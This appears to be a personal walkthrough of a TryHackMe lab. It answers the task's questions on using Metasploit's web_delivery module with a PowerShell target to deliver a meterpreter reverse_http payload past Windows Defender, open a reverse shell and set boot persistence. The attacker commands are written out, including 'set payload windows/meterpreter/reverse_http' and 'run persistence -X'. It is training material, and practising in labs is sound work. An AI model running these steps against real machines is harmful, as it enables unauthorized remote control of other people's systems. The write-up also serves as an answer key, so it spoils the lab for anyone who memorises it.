Now that we've thoroughly compromised our target machine, let's return to our exploitation tools so that we can gain remote shell access and persistence.

  

![](https://i.imgur.com/1LzGblJ.jpg)  

Answer the questions below


| Question                                                                                                                                                                                                                                                                                                                                  | Answer                            | SS                                   |
| ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------- | ------------------------------------ |
| Return to your attacker machine for this next bit. Since we know our victim machine is running Windows Defender, let's go ahead and try a different method of payload delivery! For this, we'll be using the script web delivery exploit within Metasploit. Launch Metasploit now and select 'exploit/multi/script/web_delivery' for use. | exploit/multi/script/web_delivery | ![[Pasted image 20240314225630.png]] |
```
exploit/multi/script/web_delivery
```


| Question                                                                     | Answer | SS                                   |
| ---------------------------------------------------------------------------- | ------ | ------------------------------------ |
| First, let's set the target to PSH (PowerShell). Which target number is PSH? | 2      | ![[Pasted image 20240314225839.png]] |



| Question                                                                                                                                                                                 | Answer           | SS                                   |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------- | ------------------------------------ |
| After setting your payload, set your lhost and lport accordingly such that you know which port the MSF web server is going to run on and that it'll be running on the TryHackMe network. | No answer needed | ![[Pasted image 20240314230036.png]] |



| Question                                                                                                                                                                                                                                        | Answer           | SS  |
| ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------- | --- |
| Finally, let's set our payload. In this case, we'll be using a simple reverse HTTP payload. Do this now with the command: 'set payload windows/meterpreter/reverse_http'. Following this, launch the attack as a job with the command 'run -j'. | No answer needed | ![[Pasted image 20240314231522.png]]    |
```
set payload windows/meterpreter/reverse_http
```
```
run -j
```

| Question                                                                                                                                                                                                                                                                                                                                                                                                                                                      | Answer           | SS                                   |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------- | ------------------------------------ |
| Return to the terminal we spawned with our exploit. In this terminal, paste the command output by Metasploit after the job was launched. In this case, I've found it particularly helpful to host a simple python web server (python3 -m http.server) and host the command in a text file as copy and paste between the machines won't always work. Once you've run this command, return to our attacker machine and note that our reverse shell has spawned. | No answer needed | ![[Pasted image 20240314232037.png]] |
![[Pasted image 20240314232120.png]]

![[Pasted image 20240315192815.png]]


| Question                                                                                                                                                                                                                                                                                     | Answer             | SS                                   |
| -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------ | ------------------------------------ |
| Last but certainly not least, let's look at persistence mechanisms via Metasploit. What command can we run in our meterpreter console to setup persistence which automatically starts when the system boots? Don't include anything beyond the base command and the option for boot startup. | run persistence -X | ![[Pasted image 20240315193118.png]] |
```
run persistence -h
```



| Question                                                                                                                                                                                                                                                                                                                                                   | Answer           | SS  |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------- | --- |
| Run this command now with options that allow it to connect back to your host machine should the system reboot. Note, you'll need to create a listener via the handler exploit to allow for this remote connection in actual practice. Congrats, you've now gain full control over the remote host and have established persistence for further operations! | No answer needed |     |
